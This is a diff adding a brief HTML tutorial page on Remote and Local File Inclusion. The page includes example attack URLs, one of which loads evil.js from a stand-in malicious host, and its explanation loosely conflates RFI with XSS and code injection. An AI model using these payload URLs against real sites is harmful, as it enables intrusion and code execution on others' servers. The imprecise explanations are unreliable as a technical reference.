@@ -1,0 +1,17 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<head>
+<link type='text/css' rel='stylesheet' href='../stylesheet/styles.css' />
+</head>
+<body style='background-color:#3a3d32'>
+<h2>RFI & LFI</h2>
+<p>
+Local File Includes is an easy way for an attacker to view files on a server that were not meant to be viewed or retrieved. again through a misconfigured server and bad coding an attacker can view local files in the current page. Here's an example of what a LFI attack might look like:<br />
+http://somesite.com?page=pass.txt<br />
+This is a very simple example of how this type of attack can be implemented. There are many different was that someone could use this type of attack, another example is using Xss where pass.txt is to try and inject code on the page.<br /><br />
+Remote File Includes can be used for just about every variation of Xss, Code Injection, Session Hijacking, and many others. A RFI attack might look like this:<br />
+http://somesite.com?page=http://www.malicious.site.com/evil.js<br /><br />
+I have heard RFI called Code Injection, this can be a true statement if implemented correctly through the use of Xss. RFI is possible through a misconfigured server and bad coding. The server allows URL file access and the code leaves a query string empty for a page or file include this is true for both RFI and LFI.
+</p>
+</body>
+</html>
